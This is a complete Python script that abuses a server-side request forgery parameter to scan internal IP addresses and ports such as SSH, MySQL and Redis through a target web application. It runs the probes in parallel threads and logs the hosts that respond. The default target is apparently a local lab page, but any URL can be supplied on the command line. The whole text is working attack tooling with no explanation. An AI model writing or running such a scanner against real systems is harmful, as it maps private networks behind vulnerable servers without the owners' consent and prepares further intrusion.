import requests
import sys
from concurrent.futures import ThreadPoolExecutor

target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/ssrf_lab.php?url="
internal_ips = ["127.0.0.1", "192.168.1.1", "10.0.0.1", "172.16.0.1"]
ports = [22, 80, 443, 3306, 6379, 8080]

def scan(ip, port):
    url = f"{target}http://{ip}:{port}"
    try:
        r = requests.get(url, timeout=2)
        if r.status_code == 200:
            print(f"\033[92m[OPEN] {ip}:{port}\033[0m")
            with open("../logs/ssrf_scan.txt", "a") as f:
                f.write(f"{ip}:{port} -> {r.status_code}\n")
        else:
            print(f"\033[90m[CLOSED] {ip}:{port}\033[0m")
    except:
        print(f"\033[90m[TIMEOUT] {ip}:{port}\033[0m")

with ThreadPoolExecutor(max_workers=20) as ex:
    for ip in internal_ips:
        for port in ports:
            ex.submit(scan, ip, port)